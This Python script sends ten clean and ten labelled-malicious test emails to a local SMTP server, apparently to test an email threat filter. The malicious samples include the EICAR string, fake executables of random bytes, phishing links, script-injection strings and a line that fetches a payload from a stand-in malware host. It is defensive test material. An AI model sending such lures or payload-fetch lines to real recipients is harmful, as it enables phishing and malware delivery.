#!/usr/bin/env python3
import smtplib
import os
from email.message import EmailMessage
import time

# ───── Configuration ─────────────────────────────────────────────────────────
SMTP_HOST = "127.0.0.1"
SMTP_PORT = 25
FROM_ADDR  = "sender@email-threat-docker.local"
TO_ADDR    = "recipient@email-threat-docker.local"

fake_pe = b"MZ" + b"\x00" * (0x3C - 2) + b"PE\x00\x00" + os.urandom(1000)
# ───── Test Messages ─────────────────────────────────────────────────────────
tests = [
    # 10 Clean Emails
    ("Team Lunch", "Who's up for pizza on Friday?", None),
    ("Project Update", "The Q2 deliverables are attached", {"report.pdf": b"PDF: Project milestones..."}),
    ("Meeting Reminder", "Don't forget our 2pm meeting!", None),
    ("Network Maintenance", "Scheduled downtime tonight 11PM-1AM", None),
    ("New Policy Document", "Please review attached handbook", {"handbook.docx": b"DOCX: Company policies..."}),
    ("Welcome New Hire", "Please welcome Alice to the team!", None),
    ("Office Closure", "HQ will be closed for Memorial Day", None),
    ("Benefits Update", "New healthcare options available", None),
    ("Password Policy Reminder", "Remember to change passwords quarterly", None),
    ("Conference Registration", "Industry summit registration open", None),

    # 10 Malicious Emails (with rule triggers)
    ("URGENT: Security Alert", "Scan attached file immediately!",
     {"eicar.com": b"X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"}),

    ("Invoice #INV-9876", "Please review payment details",
     {"invoice.exe": b"MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff" + b"PE\x00\x00" + os.urandom(1000)}),

    ("Account Verification Needed", "Click here: http://malicious.link/verify?user=<script>stealCreds()</script>", None),

    ("Document Shared", """<html><body><script>malware.download()</script>View document</body></html>""",
     None, "html"),

    ("Encrypted Report", "Password: infected",
     {"data.bin": os.urandom(1024)}),

    ("Password Reset Required", "Immediate action required: http://phishing-site.com/reset", None),

    ("Your Package Tracking", "javascript:fetch('http://malware-download.com/payload')", None),

    ("Financial Report", "See attached analysis",
     {"report.zip": b"\x50\x4B\x03\x04FakeZIP"}),  # ZIP header match

    ("Microsoft Security Update", "Critical patch - apply immediately",
     {"update.msi": fake_pe}),

    ("Undelivered Mail Notification", """<img src="http://tracker.com/pixel.gif">""",
     {"details.eml": b"From: <spoofed@ceo.com>\nSubject: Wire transfer\n"})
]

def send_email(subject, body, attachment=None, content_type="plain"):
    msg = EmailMessage()
    msg["From"] = FROM_ADDR
    msg["To"] = TO_ADDR
    msg["Subject"] = subject
    msg.set_content(body, subtype=content_type)

    if attachment:
        for fname, data in attachment.items():
            msg.add_attachment(data,
                               maintype="application",
                               subtype="octet-stream",
                               filename=fname)
    with smtplib.SMTP(SMTP_HOST, SMTP_PORT) as smtp:
        result = smtp.send_message(msg)
    return result

def main():
    print("Sending test emails...\n")
    for i, test in enumerate(tests):
        if len(test) == 3:
            subj, body, attach = test
            content_type = "plain"
        else:
            subj, body, attach, content_type = test

        resp = send_email(subj, body, attach, content_type)
        status = "CLEAN" if i < 10 else "MALICIOUS"
        print(f"[{status}] {subj}: {'Delivered' if not resp else 'Blocked'}")

if __name__ == "__main__":
    main()

